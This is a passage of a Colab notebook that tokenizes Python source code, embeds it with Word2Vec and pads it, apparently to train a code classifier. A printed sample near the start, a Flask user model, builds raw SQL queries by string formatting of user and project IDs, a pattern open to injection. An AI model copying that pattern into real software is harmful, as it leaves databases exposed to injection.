db.session.commit()\\n\\n    def set_email_verified_status(self, is_verified: bool):\\n        \\\"\\\"\\\" Updates email verfied flag on successfully verified emails\\\"\\\"\\\"\\n        self.is_email_verified = is_verified\\n        db.session.commit()\\n\\n    def set_is_expert(self, is_expert: bool):\\n        \\\"\\\"\\\" Enables or disables expert mode on the user\\\"\\\"\\\"\\n        self.is_expert = is_expert\\n        db.session.commit()\\n\\n    @staticmethod\\n    def get_all_users(query: UserSearchQuery) -> UserSearchDTO:\\n        \\\"\\\"\\\" Search and filter all users \\\"\\\"\\\"\\n\\n        # Base query that applies to all searches\\n        base = db.session.query(User.id, User.username, User.mapping_level, User.role)\\n\\n        # Add filter to query as required\\n        if query.mapping_level:\\n            base = base.filter(User.mapping_level == MappingLevel[query.mapping_level.upper()].value)\\n        if query.username:\\n            base = base.filter(User.username.ilike(query.username.lower() + '%'))\\n        if query.role:\\n            base = base.filter(User.role == UserRole[query.role.upper()].value)\\n\\n        results = base.order_by(User.username).paginate(query.page, 20, True)\\n\\n        dto = UserSearchDTO()\\n        for result in results.items:\\n            listed_user = ListedUser()\\n            listed_user.id = result.id\\n            listed_user.mapping_level = MappingLevel(result.mapping_level).name\\n            listed_user.username = result.username\\n            listed_user.role = UserRole(result.role).name\\n\\n            dto.users.append(listed_user)\\n\\n        dto.pagination = Pagination(results)\\n        return dto\\n\\n    @staticmethod\\n    def get_all_users_not_pagainated():\\n        \\\"\\\"\\\" Get all users in DB\\\"\\\"\\\"\\n        return db.session.query(User.id).all()\\n\\n\\n    @staticmethod\\n    def filter_users(user_filter: str, project_id: int, page: int) -> UserFilterDTO:\\n        \\\"\\\"\\\" Finds users that matches first characters, for auto-complete.\\n\\n        Users who have participated (mapped or validated) in the project, if given, will be\\n        returned ahead of those who have not.\\n        \\\"\\\"\\\"\\n        # Note that the projects_mapped column includes both mapped and validated projects.\\n        results = db.session.query(User.username, User.projects_mapped.any(project_id).label(\\\"participant\\\")) \\\\\\n            .filter(User.username.ilike(user_filter.lower() + '%')) \\\\\\n            .order_by(desc(\\\"participant\\\").nullslast(), User.username).paginate(page, 20, True)\\n        if results.total == 0:\\n            raise NotFound()\\n\\n        dto = UserFilterDTO()\\n        for result in results.items:\\n            dto.usernames.append(result.username)\\n            if project_id is not None:\\n                participant = ProjectParticipantUser()\\n                participant.username = result.username\\n                participant.project_id = project_id\\n                participant.is_participant = bool(result.participant)\\n                dto.users.append(participant)\\n\\n        dto.pagination = Pagination(results)\\n        return dto\\n\\n    @staticmethod\\n    def upsert_mapped_projects(user_id: int, project_id: int):\\n        \\\"\\\"\\\" Adds projects to mapped_projects if it doesn't exist \\\"\\\"\\\"\\n        sql = \\\"select * from users where id = {0} and projects_mapped @> '{{{1}}}'\\\".format(user_id, project_id)\\n        result = db.engine.execute(sql)\\n\\n        if result.rowcount > 0:\\n            return  # User has previously mapped this project so return\\n\\n        sql = '''update users\\n                    set projects_mapped = array_append(projects_mapped, {0})\\n                  where id = {1}'''.format(project_id, user_id)\\n\\n        db.engine.execute(sql)\\n\\n    @staticmethod\\n    def get_mapped_projects(user_id: int, preferred_locale: str) -> UserMappedProjectsDTO:\\n        \\\"\\\"\\\" Get all projects a user has mapped on \\\"\\\"\\\"\\n\\n        # This query looks scary, but we're really just creating an outer join between the query that gets the\\n        # counts of all mapped tasks and the query that gets counts of all validated tasks.  This is necessary to\\n        # handle cases where users have only validated tasks on a project, or only mapped on a project.\\n        sql = '''SELECT p.id,\\n                        p.status,\\n                        p.default_locale,\\n                        c.mapped,\\n                        c.validated,\\n                        st_asgeojson(p.centroid)\\n                   FROM projects p,\\n                        (SELECT coalesce(v.project_id, m.project_id) project_id,\\n                                coalesce(v.validated, 0) validated,\\n                                coalesce(m.mapped, 0) mapped\\n                          FROM (SELECT t.project_id,\\n                                       count (t.validated_by) validated\\n                                  FROM tasks t\\n                                 WHERE t.project_id IN (SELECT unnest(projects_mapped) FROM users WHERE id = {0})\\n                                   AND t.validated_by = {0}\\n                                 GROUP BY t.project_id, t.validated_by) v\\n                         FULL OUTER JOIN\\n                        (SELECT t.project_id,\\n                                count(t.mapped_by) mapped\\n                           FROM tasks t\\n                          WHERE t.project_id IN (SELECT unnest(projects_mapped) FROM users WHERE id = {0})\\n                            AND t.mapped_by = {0}\\n                          GROUP BY t.project_id, t.mapped_by) m\\n                         ON v.project_id = m.project_id) c\\n                   WHERE p.id = c.project_id ORDER BY p.id DESC'''.format(user_id)\\n\\n        results = db.engine.execute(sql)\\n\\n        if results.rowcount == 0:\\n            raise NotFound()\\n\\n        mapped_projects_dto = UserMappedProjectsDTO()\\n        for row in results:\\n            mapped_project = MappedProject()\\n            mapped_project.project_id = row[0]\\n            mapped_project.status = ProjectStatus(row[1]).name\\n            mapped_project.tasks_mapped = row[3]\\n            mapped_project.tasks_validated = row[4]\\n            mapped_project.centroid = geojson.loads(row[5])\\n\\n            project_info = ProjectInfo.get_dto_for_locale(row[0], preferred_locale, row[2])\\n            mapped_project.name = project_info.name\\n\\n            mapped_projects_dto.mapped_projects.append(mapped_project)\\n\\n        return mapped_projects_dto\\n\\n    def set_user_role(self, role: UserRole):\\n        \\\"\\\"\\\" Sets the supplied role on the user \\\"\\\"\\\"\\n        self.role = role.value\\n        db.session.commit()\\n\\n    def set_mapping_level(self, level: MappingLevel):\\n        \\\"\\\"\\\" Sets the supplied level on the user \\\"\\\"\\\"\\n        self.mapping_level = level.value\\n        db.session.commit()\\n\\n    def accept_license_terms(self, license_id: int):\\n        \\\"\\\"\\\" Associate the user in scope with the supplied license \\\"\\\"\\\"\\n        image_license = License.get_by_id(license_id)\\n        self.accepted_licenses.append(image_license)\\n        db.session.commit()\\n\\n    def has_user_accepted_licence(self, license_id: int):\\n        \\\"\\\"\\\" Test to see if the user has accepted the terms of the specified license\\\"\\\"\\\"\\n        image_license = License.get_by_id(license_id)\\n\\n        if image_license in self.accepted_licenses:\\n            return True\\n\\n        return False\\n\\n    def delete(self):\\n        \\\"\\\"\\\" Delete the user in scope from DB \\\"\\\"\\\"\\n        db.session.delete(self)\\n        db.session.commit()\\n\\n    def as_dto(self, logged_in_username: str) -> UserDTO:\\n        \\\"\\\"\\\" Create DTO object from user in scope \\\"\\\"\\\"\\n        user_dto = UserDTO()\\n        user_dto.id = self.id\\n        user_dto.username = self.username\\n        user_dto.role = UserRole(self.role).name\\n        user_dto.mapping_level = MappingLevel(self.mapping_level).name\\n        user_dto.is_expert = self.is_expert or False\\n        user_dto.date_registered = str(self.date_registered)\\n        try:\\n            user_dto.projects_mapped = len(self.projects_mapped)\\n        # Handle users that haven't touched a project yet.\\n        except:\\n            user_dto.projects_mapped = 0\\n        user_dto.tasks_mapped = self.tasks_mapped\\n        user_dto.tasks_validated = self.tasks_validated\\n        user_dto.tasks_invalidated = self.tasks_invalidated\\n        user_dto.twitter_id = self.twitter_id\\n        user_dto.linkedin_id = self.linkedin_id\\n        user_dto.facebook_id = self.facebook_id\\n        user_dto.validation_message = self.validation_message\\n        user_dto.total_time_spent = 0\\n        user_dto.time_spent_mapping = 0\\n        user_dto.time_spent_validating = 0\\n\\n        sql = \\\"\\\"\\\"SELECT SUM(TO_TIMESTAMP(action_text, 'HH24:MI:SS')::TIME) FROM task_history\\n                WHERE action='LOCKED_FOR_VALIDATION'\\n                and user_id = {0};\\\"\\\"\\\".format(self.id)\\n        total_validation_time = db.engine.execute(sql)\\n        for row in total_validation_time:\\n            total_validation_time = row[0]\\n            if total_validation_time:\\n                total_validation_seconds = total_validation_time.total_seconds()\\n                user_dto.time_spent_validating = total_validation_seconds\\n                user_dto.total_time_spent += user_dto.time_spent_validating\\n\\n        sql = \\\"\\\"\\\"SELECT SUM(TO_TIMESTAMP(action_text, 'HH24:MI:SS')::TIME) FROM task_history\\n                WHERE action='LOCKED_FOR_MAPPING'\\n                and user_id = {0};\\\"\\\"\\\".format(self.id)\\n        total_mapping_time = db.engine.execute(sql)\\n        for row in total_mapping_time:\\n            total_mapping_time = row[0]\\n            if total_mapping_time:\\n                total_mapping_seconds = total_mapping_time.total_seconds()\\n                user_dto.time_spent_mapping = total_mapping_seconds\\n                user_dto.total_time_spent += user_dto.time_spent_mapping\\n\\n        if self.username == logged_in_username:\\n            # Only return email address when logged in user is looking at their own profile\\n            user_dto.email_address = self.email_address\\n            user_dto.is_email_verified = self.is_email_verified\\n        return user_dto\\n\"\n        ],\n        \"semantic_type\": \"\",\n        \"description\": \"\"\n      }\n    }\n  ]\n}"
            }
          },
          "metadata": {},
          "execution_count": 3
        }
      ]
    },
    {
      "cell_type": "code",
      "source": [
        "import tokenize\n",
        "from io import BytesIO\n",
        "from tensorflow.keras.preprocessing.sequence import pad_sequences # Import pad_sequences\n",
        "\n",
        "def tokenize_python(code_str, mask_string=True, mask_number=True):\n",
        "    \"\"\"\n",
        "    Python 내장 tokenize 모듈로 소스코드를 토큰화.\n",
        "    - 문자열 리터럴은 마스킹 해제 (옵션)\n",
        "    - 숫자 리터럴은 마스킹 해제 (옵션)\n",
        "    - 주석은 제거\n",
        "    - 들여쓰기/줄바꿈은 <INDENT>, <DEDENT>, <EOL>로 표시\n",
        "    \"\"\"\n",
        "    toks = []\n",
        "    try:\n",
        "        g = tokenize.tokenize(BytesIO(code_str.encode(\"utf-8\")).readline)\n",
        "        SKIP = {tokenize.ENCODING, tokenize.ENDMARKER, tokenize.NL}\n",
        "\n",
        "        for toknum, tokval, _, _, _ in g:\n",
        "            if toknum in SKIP:\n",
        "                continue\n",
        "            if toknum == tokenize.COMMENT:\n",
        "                continue\n",
        "\n",
        "            # Check if the token is a string literal that looks like a multiline comment/docstring\n",
        "            if toknum == tokenize.STRING:\n",
        "                if (tokval.startswith('\"\"\"') and tokval.endswith('\"\"\"')) or \\\n",
        "                   (tokval.startswith(\"'''\") and tokval.endswith(\"'''\")):\n",
        "                    # Skip this token as it's likely a multiline comment or docstring\n",
        "                    continue\n",
        "\n",
        "\n",
        "            if toknum == tokenize.NEWLINE:\n",
        "                toks.append(\"<EOL>\"); continue\n",
        "            if toknum == tokenize.INDENT:\n",
        "                toks.append(\"<INDENT>\"); continue # 코드 블럭 시작\n",
        "            if toknum == tokenize.DEDENT:\n",
        "                toks.append(\"<DEDENT>\"); continue # 코드 블럭 끝\n",
        "\n",
        "            # If we reach here, it's a regular token or a string that wasn't skipped\n",
        "            toks.append(tokval)\n",
        "    except (tokenize.TokenError, IndentationError, SyntaxError):\n",
        "        # 코드가 불완전해서 tokenize 실패하는 경우 건너뜜\n",
        "        pass\n",
        "    return toks"
      ],
      "metadata": {
        "id": "Pq_270kIKv2c"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "# Test the tokenize_python function with example code including comments\n",
        "\n",
        "example_code_with_comments = \"\"\"\n",
        "# This is a single-line comment\n",
        "\n",
        "'''\n",
        "This is a multi-line comment\n",
        "spanning multiple lines.\n",
        "'''\n",
        "\n",
        "def my_function(x):\n",
        "    # Another single-line comment inside a function\n",
        "    ''' Docstrings are usually kept, but this tokenizer might remove them depending on placement. '''\n",
        "    result = x + 1 # Inline comment\n",
        "    return result\n",
        "\n",
        "\\\"\\\"\\\"\n",
        "This is another multi-line comment\n",
        "using double quotes.\n",
        "\\\"\\\"\\\"\n",
        "class MyClass:\n",
        "    # Class comment\n",
        "    pass\n",
        "\"\"\"\n",
        "\n",
        "tokenized_example = tokenize_python(example_code_with_comments)\n",
        "\n",
        "print(\"Original Code:\")\n",
        "print(example_code_with_comments)\n",
        "print(\"\\nTokenized Output:\")\n",
        "print(tokenized_example)"
      ],
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "ez0WM97ugW7r",
        "outputId": "29d59f6a-c975-4126-d965-f21b461a015b"
      },
      "execution_count": null,
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Original Code:\n",
            "\n",
            "# This is a single-line comment\n",
            "\n",
            "'''\n",
            "This is a multi-line comment\n",
            "spanning multiple lines.\n",
            "'''\n",
            "\n",
            "def my_function(x):\n",
            "    # Another single-line comment inside a function\n",
            "    ''' Docstrings are usually kept, but this tokenizer might remove them depending on placement. '''\n",
            "    result = x + 1 # Inline comment\n",
            "    return result\n",
            "\n",
            "\"\"\"\n",
            "This is another multi-line comment\n",
            "using double quotes.\n",
            "\"\"\"\n",
            "class MyClass:\n",
            "    # Class comment\n",
            "    pass\n",
            "\n",
            "\n",
            "Tokenized Output:\n",
            "['<EOL>', 'def', 'my_function', '(', 'x', ')', ':', '<EOL>', '<INDENT>', '<EOL>', 'result', '=', 'x', '+', '1', '<EOL>', 'return', 'result', '<EOL>', '<DEDENT>', '<EOL>', 'class', 'MyClass', ':', '<EOL>', '<INDENT>', 'pass', '<EOL>', '<DEDENT>']\n"
          ]
        }
      ]
    },
    {
      "cell_type": "code",
      "source": [
        "from gensim.models import Word2Vec\n",
        "import os\n",
        "\n",
        "# Load the pre-trained Word2Vec model\n",
        "model_path = os.path.join(workspace_path, 'word2vec_withString10-6-100.model')\n",
        "try:\n",
        "    w2v_model = Word2Vec.load(model_path)\n",
        "    print(f\"Word2Vec model loaded successfully from {model_path}\")\n",
        "except FileNotFoundError:\n",
        "    print(f\"Error: Model file not found at {model_path}\")\n",
        "    w2v_model = None\n",
        "\n",
        "def get_word_embedding(token, model):\n",
        "    \"\"\"\n",
        "    Get the embedding vector for a given token using the Word2Vec model.\n",
        "    Returns a zero vector if the token is not in the vocabulary.\n",
        "    \"\"\"\n",
        "    if model and token in model.wv:\n",
        "        return model.wv[token]\n",
        "    else:\n",
        "        # Return a zero vector for out-of-vocabulary words\n",
        "        return np.zeros(model.vector_size) if model else None\n",
        "\n",
        "def embed_sequences(tokenized_sequences, model):\n",
        "    \"\"\"\n",
        "    Convert a list of tokenized sequences into a list of embedding sequences.\n",
        "    \"\"\"\n",
        "    if not model:\n",
        "        print(\"Word2Vec model not loaded. Cannot embed sequences.\")\n",
        "        return None\n",
        "\n",
        "    embedded_sequences = []\n",
        "    for sequence in tokenized_sequences:\n",
        "        embedded_sequence = [get_word_embedding(token, model) for token in sequence]\n",
        "        # Filter out None values if model wasn't loaded\n",
        "        embedded_sequence = [emb for emb in embedded_sequence if emb is not None]\n",
        "        if embedded_sequence:\n",
        "             embedded_sequences.append(np.array(embedded_sequence))\n",
        "        else:\n",
        "            # Handle cases where a sequence results in no valid embeddings\n",
        "            embedded_sequences.append(np.array([])) # Append an empty array or handle as needed\n",
        "\n",
        "    return embedded_sequences\n",
        "\n",
        "# Example of how to use the embedding function (assuming you have tokenized sequences)\n",
        "# For example, if you have a list of tokenized sequences called `tokenized_data`:\n",
        "# embedded_data = embed_sequences(tokenized_data, w2v_model)\n",
        "# print(\"Example of embedded sequence:\")\n",
        "# if embedded_data and len(embedded_data) > 0:\n",
        "#     print(embedded_data[0])"
      ],
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "2DAdcOoqNZ3u",
        "outputId": "c56e6b08-0f20-41c2-b8ca-1ec68ee9e57e"
      },
      "execution_count": null,
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Word2Vec model loaded successfully from /content/drive/MyDrive/fortmp/word2vec_withString10-6-100.model\n"
          ]
        }
      ]
    },
    {
      "cell_type": "code",
      "source": [
        "\n",
        "def pad_token_sequences(sequences, maxlen, padding='post', truncating='post'):\n",
        "    \"\"\"\n",
        "    토큰화된 시퀀스에 패딩을 적용하여 길이를 맞춤.\n",
        "    \"\"\"\n",
        "    return pad_sequences(sequences, maxlen=maxlen, padding=padding, truncating=truncating)"
      ],
      "metadata": {
        "id": "vd5nWOXaN6cd"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/",
          "height": 348
        },
        "id": "c3ccfccf",
        "outputId": "91d9d717-10cc-4eaf-8e16-cd5e119c18e0"
      },
      "source": [
        "# Apply tokenization, embedding, and padding to the 'source' column of df_sample\n",
        "\n",
        "# 1. Tokenize the 'source' column\n",
        "df_sample['tokenized_source'] = df_sample['source'].apply(tokenize_python)\n",
        "\n",
        "# 2. Embed the tokenized sequences using the loaded Word2Vec model\n",
        "# Ensure w2v_model was loaded successfully in the previous step\n",
        "if w2v_model:\n",
        "    df_sample['embedded_source'] = embed_sequences(df_sample['tokenized_source'].tolist(), w2v_model)\n",
        "else:\n",
        "    print(\"Word2Vec model not loaded. Cannot embed sequences.\")\n",
        "    df_sample['embedded_source'] = None # Or handle appropriately\n",
        "\n",
        "# 3. Pad the embedded sequences\n",
        "# Determine the maximum sequence length. You might want to choose a fixed length or calculate based on your data.\n",
        "# For this example, let's use a maxlen of 100 as used in the previous padded example attempt.\n",
        "# Note: pad_sequences works directly on numerical sequences. Since embed_sequences returns numpy arrays of embeddings,\n",
        "# we need to pad these arrays. The numpy padding function or a custom padding logic might be more suitable here\n",
        "# depending on the desired padding value (e.g., a zero vector).\n",
        "\n",
        "# Let's refine the padding step to handle the embedded sequences (numpy arrays) correctly.\n",
        "# Keras pad_sequences is designed for sequences of integers representing word indices.\n",
        "# For sequences of embedding vectors (float arrays), we can use numpy's pad or a manual approach.\n",
        "\n",
        "# Let's assume we want to pad with zero vectors of the same dimension as the embeddings\n",
        "if w2v_model and df_sample['embedded_source'] is not None:\n",
        "    max_sequence_length = 100 # Define your desired max length\n",
        "    embedding_dim = w2v_model.vector_size\n",
        "\n",
        "    padded_embedded_sequences = []\n",
        "    for embedded_sequence in df_sample['embedded_source']:\n",
        "        if embedded_sequence.size > 0:\n",
        "            # Calculate padding needed\n",
        "            padding_length = max_sequence_length - embedded_sequence.shape[0]\n",
        "            if padding_length > 0:\n",
        "                # Create padding of zero vectors\n",
        "                padding = np.zeros((padding_length, embedding_dim))\n",
        "                # Concatenate original sequence with padding\n",
        "                padded_sequence = np.concatenate((embedded_sequence, padding), axis=0)\n",
        "            else:\n",
        "                # Truncate if sequence is longer than max_sequence_length\n",
        "                padded_sequence = embedded_sequence[:max_sequence_length]\n",
        "        else:\n",
        "            # Handle empty embedded sequences (e.g., code that couldn't be tokenized/embedded)\n",
        "            padded_sequence = np.zeros((max_sequence_length, embedding_dim)) # Pad with zeros\n",
        "\n",
        "        padded_embedded_sequences.append(padded_sequence)\n",
        "\n",
        "    df_sample['padded_embedded_source'] = padded_embedded_sequences\n",
        "    print(\"\\nExample of padded embedded sequence shape:\")\n",
        "    if padded_embedded_sequences:\n",
        "        print(padded_embedded_sequences[0].shape)\n",
        "\n",
        "    display(df_sample[['source', 'tokenized_source', 'padded_embedded_source']].head())\n",
        "\n",
        "elif df_sample['embedded_source'] is None:\n",
        "    print(\"Embedding step failed. Cannot proceed with padding.\")"
      ],
      "execution_count": null,
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "\n",
            "Example of padded embedded sequence shape:\n",
            "(100, 100)\n"
          ]
        },
        {
          "output_type": "display_data",
          "data": {
            "text/plain": [
              "                                              source  \\\n",
              "0  \\nfrom django.shortcuts import render from dja...   \n",
              "1  \\nfrom django.shortcuts import render from dja...   \n",
              "2  \\nfrom django.shortcuts import render from dja...   \n",
              "3  \\nfrom django.shortcuts import render from dja...   \n",
              "4  \\n\\nfrom libtmux import Server from yaml impor...   \n",
              "\n",
              "                                    tokenized_source  \\\n",
              "0  [from, django, ., shortcuts, import, render, f...   \n",
              "1  [from, django, ., shortcuts, import, render, f...   \n",
              "2  [from, django, ., shortcuts, import, render, f...   \n",
              "3  [from, django, ., shortcuts, import, render, f...   \n",
              "4  [from, libtmux, import, Server, from, yaml, im...   \n",
              "\n",
              "                              padded_embedded_source  \n",
              "0  [[-0.014500350691378117, 2.52592396736145, -0....  \n",
              "1  [[-0.014500350691378117, 2.52592396736145, -0....  \n",
              "2  [[-0.014500350691378117, 2.52592396736145, -0....  \n",
              "3  [[-0.014500350691378117, 2.52592396736145, -0....  \n",
              "4  [[-0.014500350691378117, 2.52592396736145, -0....  "
            ],
            "text/html": [
              "\n",
              "  <div id=\"df-817f0a02-3f60-43de-9201-f13bc5f6c486\" class=\"colab-df-container\">\n",
              "    <div>\n",
              "<style scoped>\n",
              "    .dataframe tbody tr th:only-of-type {\n",
              "        vertical-align: middle;\n",
              "    }\n",
              "\n",
              "    .dataframe tbody tr th {\n",
              "        vertical-align: top;\n",
              "    }\n",
              "\n",
              "    .dataframe thead th {\n",
              "        text-align: right;\n",
              "    }\n",
              "</style>\n",
              "<table border=\"1\" class=\"dataframe\">\n",
              "  <thead>\n",
              "    <tr style=\"text-align: right;\">\n",
              "      <th></th>\n",
              "      <th>source</th>\n",
              "      <th>tokenized_source</th>\n",
              "      <th>padded_embedded_source</th>\n",
              "    </tr>\n",
              "  </thead>\n",
              "  <tbody>\n",
              "    <tr>\n",
              "      <th>0</th>\n",
              "      <td>\\nfrom django.shortcuts import render from dja...</td>\n",
              "      <td>[from, django, ., shortcuts, import, render, f...</td>\n",
              "      <td>[[-0.014500350691378117, 2.52592396736145, -0....</td>\n",
              "    </tr>\n",
              "    <tr>\n",
              "      <th>1</th>\n",
              "      <td>\\nfrom django.shortcuts import render from dja...</td>\n",
              "      <td>[from, django, ., shortcuts, import, render, f...</td>\n",
              "      <td>[[-0.014500350691378117, 2.52592396736145, -0....</td>\n",
              "    </tr>\n",
              "    <tr>\n",
              "      <th>2</th>\n",
              "      <td>\\nfrom django.shortcuts import render from dja...</td>\n",
              "      <td>[from, django, ., shortcuts, import, render, f...</td>\n",
              "      <td>[[-0.014500350691378117, 2.52592396736145, -0....</td>\n",
              "    </tr>\n",
              "    <tr>\n",
              "      <th>3</th>\n",
              "      <td>\\nfrom django.shortcuts import render from dja...</td>\n",
              "      <td>[from, django, ., shortcuts, import, render, f...</td>\n",
              "      <td>[[-0.014500350691378117, 2.52592396736145, -0....</td>\n",
              "    </tr>\n",
              "    <tr>\n",
              "      <th>4</th>\n",
              "      <td>\\n\\nfrom libtmux import Server from yaml impor...</td>\n",
              "      <td>[from, libtmux, import, Server, from, yaml, im...</td>\n",
              "      <td>[[-0.014500350691378117, 2.52592396736145, -0....</td>\n",
              "    </tr>\n",
              "  </tbody>\n",
              "</table>\n",
              "</div>\n",
              "    <div class=\"colab-df-buttons\">\n",
              "\n",
              "  <div class=\"colab-df-container\">\n",
              "    <button class=\"colab-df-convert\" onclick=\"convertToInteractive('df-817f0a02-3f60-43de-9201-f13bc5f6c486')\"\n",
              "            title=\"Convert this dataframe to an interactive table.\"\n",
              "            style=\"display:none;\">\n",
              "\n",
              "  <svg xmlns=\"http://www.w3.org/2000/svg\" height=\"24px\" viewBox=\"0 -960 960 960\">\n",
              "    <path d=\"M120-120v-720h720v720H120Zm60-500h600v-160H180v160Zm220 220h160v-160H400v160Zm0 220h160v-160H400v160ZM180-400h160v-160H180v160Zm440 0h160v-160H620v160ZM180-180h160v-160H180v160Zm440 0h160v-160H620v160Z\"/>\n",
              "  </svg>\n",
              "    </button>\n",
              "\n",
              "  <style>\n",
              "    .colab-df-container {\n",
              "      display:flex;\n",
              "      gap: 12px;\n",
              "    }\n",
              "\n",
              "    .colab-df-convert {\n",
              "      background-color: #E8F0FE;\n",
              "      border: none;\n",
              "      border-radius: 50%;\n",
              "      cursor: pointer;\n",
              "      display: none;\n",
              "      fill: #1967D2;\n",
              "      height: 32px;\n",
              "      padding: 0 0 0 0;\n",
              "      width: 32px;\n",
              "    }\n",
              "\n",
              "    .colab-df-convert:hover {\n",
              "      background-color: #E2EBFA;\n",
              "      box-shadow: 0px 1px 2px rgba(60, 64, 67, 0.3), 0px 1px 3px 1px rgba(60, 64, 67, 0.15);\n",
              "      fill: #174EA6;\n",
              "    }\n",
              "\n",
              "    .colab-df-buttons div {\n",
              "      margin-bottom: 4px;\n",
              "    }\n",
              "\n",
              "    [theme=dark] .colab-df-convert {\n",
              "      background-color: #3B4455;\n",
              "      fill: #D2E3FC;\n",
              "    }\n",
              "\n",
              "    [theme=dark] .colab-df-convert:hover {\n",
              "      background-color: #434B5C;\n",
              "      box-shadow: 0px 1px 3px 1px rgba(0, 0, 0, 0.15);\n",
              "      filter: drop-shadow(0px 1px 2px rgba(0, 0, 0, 0.3));\n",
              "      fill: #FFFFFF;\n",
              "    }\n",
              "  </style>\n",
              "\n",
              "    <script>\n",
              "      const buttonEl =\n",
              "        document.querySelector('#df-817f0a02-3f60-43de-9201-f13bc5f6c486 button.colab-df-convert');\n",
              "      buttonEl.style.display =\n",
              "        google.colab.kernel.accessAllowed ? 'block' : 'none';\n",
              "\n",
              "      async function convertToInteractive(key) {\n",
              "        const element = document.querySelector('#df-817f0a02-3f60-43de-9201-f13bc5f6c486');\n",
              "        const dataTable =\n",
              "          await google.colab.kernel.invokeFunction('convertToInteractive',\n",
              "                                                    [key], {});\n",
              "        if (!dataTable) return;\n",
              "\n",
              "        const docLinkHtml = 'Like what you see? Visit the ' +\n",
              "          '<a target=\"_blank\" href=https://colab.research.google.com/notebooks/data_table.ipynb>data table notebook</a>'\n",
              "          + ' to learn more about interactive tables.';\n",
              "        element.innerHTML = '';\n",
              "        dataTable['output_type'] = 'display_data';\n",
              "        await google.colab.output.renderOutput(dataTable, element);\n",
              "        const docLink = document.createElement('div');\n",
              "        docLink.innerHTML = docLinkHtml;\n",
              "        element.appendChild(docLink);\n",
              "      }\n",
              "    </script>\n",
              "  </div>\n",
              "\n",
              "\n",
              "    <div id=\"df-a4a05eec-628b-4a35-85d5-fa34adff5263\">\n",
              "      <button class=\"colab-df-quickchart\" onclick=\"quickchart('df-a4a05eec-628b-4a35-85d5-fa34adff5263')\"\n",
              "                title=\"Suggest charts\"\n",
              "                style=\"display:none;\">\n",
              "\n",
              "<svg xmlns=\"http://www.w3.org/2000/svg\" height=\"24px\"viewBox=\"0 0 24 24\"\n",
              "     width=\"24px\">\n",
              "    <g>\n",
              "        <path d=\"M19 3H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zM9 17H7v-7h2v7zm4 0h-2V7h2v10zm4 0h-2v-4h2v4z\"/>\n",
              "    </g>\n",
              "</svg>\n",
              "      </button>\n",
              "\n",
              "<style>\n",
              "  .colab-df-quickchart {\n",
              "      --bg-color: #E8F0FE;\n",
              "      --fill-color: #1967D2;\n",
              "      --hover-bg-color: #E2EBFA;\n",
              "      --hover-fill-color: #174EA6;\n",
              "      --disabled-fill-color: #AAA;\n",
              "      --disabled-bg-color: #DDD;\n",
              "  }\n",
              "\n",
              "  [theme=dark] .colab-df-quickchart {\n",
              "      --bg-color: #3B4455;\n",
              "      --fill-color: #D2E3FC;\n",
              "      --hover-bg-color: #434B5C;\n",
              "      --hover-fill-color: #FFFFFF;\n",
              "      --disabled-bg-color: #3B4455;\n",
              "      --disabled-fill-color: #666;\n",
              "  }\n",
              "\n",
              "  .colab-df-quickchart {\n",
              "    background-color: var(--bg-color);\n",
              "    border: none;\n",
              "    border-radius: 50%;\n",
              "    cursor: pointer;\n",
              "    display: none;\n",
              "    fill: var(--fill-color);\n",
              "    height: 32px;\n",
              "    padding: 0;\n",
              "    width: 32px;\n",
              "  }\n",
              "\n",
              "  .colab-df-quickchart:hover {\n",
              "    background-color: var(--hover-bg-color);\n",
              "    box-shadow: 0 1px 2px rgba(60, 64, 67, 0.3), 0 1px 3px 1px rgba(60, 64, 67, 0.15);\n",
              "    fill: var(--button-hover-fill-color);\n",
              "  }\n",
              "\n",
              "  .colab-df-quickchart-complete:disabled,\n",
              "  .colab-df-quickchart-complete:disabled:hover {\n",
              "    background-color: var(--disabled-bg-color);\n",
              "    fill: var(--disabled-fill-color);\n",
              "    box-shadow: none;\n",
              "  }\n",
              "\n",
              "  .colab-df-spinner {\n",
              "    border: 2px solid var(--fill-color);\n",
              "    border-color: transparent;\n",
              "    border-bottom-color: var(--fill-color);\n",
              "    animation:\n",
              "      spin 1s steps(1) infinite;\n",
              "  }\n",
              "\n",
              "  @keyframes spin {\n",
              "    0% {\n",
              "      border-color: transparent;\n",
              "      border-bottom-color: var(--fill-color);\n",
              "      border-left-color: var(--fill-color);\n",
              "    }\n",
              "    20% {\n",
              "      border-color: transparent;\n",
              "      border-left-color: var(--fill-color);\n",
              "      border-top-color: var(--fill-color);\n",
              "    }\n",
              "    30% {\n",
              "      border-color: transparent;\n",
              "      border-left-color: var(--fill-color);\n",
              "      border-top-color: var(--fill-color);\n",
              "      border-right-color: var(--fill-color);\n",
              "    }\n",
              "    40% {\n",
              "      border-color: transparent;\n",
              "      border-right-color: var(--fill-color);\n",
              "      border-top-color: var(--fill-color);\n",
              "    }\n",
              "    60% {\n",
              "      border-color: transparent;\n",
              "      border-right-color: var(--fill-color);\n",
              "    }\n",
              "    80% {\n",
              "      border-color: transparent;\n",
              "      border-right-color: var(--fill-color);\n",
              "      border-bottom-color: var(--fill-color);\n",
              "    }\n",
              "    90% {\n",
              "      border-color: transparent;\n",
              "      border-bottom-color: var(--fill-color);\n",
              "    }\n",
              "  }\n",
              "</style>\n",
              "\n",
              "      <script>\n",
              "        async function quickchart(key) {\n",
              "          const quickchartButtonEl =\n",
              "            document.querySelector('#' + key + ' button');\n",
              "          quickchartButtonEl.disabled = true;  // To prevent multiple clicks.\n",
              "          quickchartButtonEl.classList.add('colab-df-spinner');\n",
              "          try {\n",
              "            const charts = await google.colab.kernel.invokeFunction(\n",
              "                'suggestCharts', [key], {});\n",
              "          } catch (error) {\n",
              "            console.error('Error during call to suggestCharts:', error);\n",
              "          }\n",
              "          quickchartButtonEl.classList.remove('colab-df-spinner');\n",
              "          quickchartButtonEl.classList.add('colab-df-quickchart-complete');\n",
              "        }\n",
              "        (() => {\n",
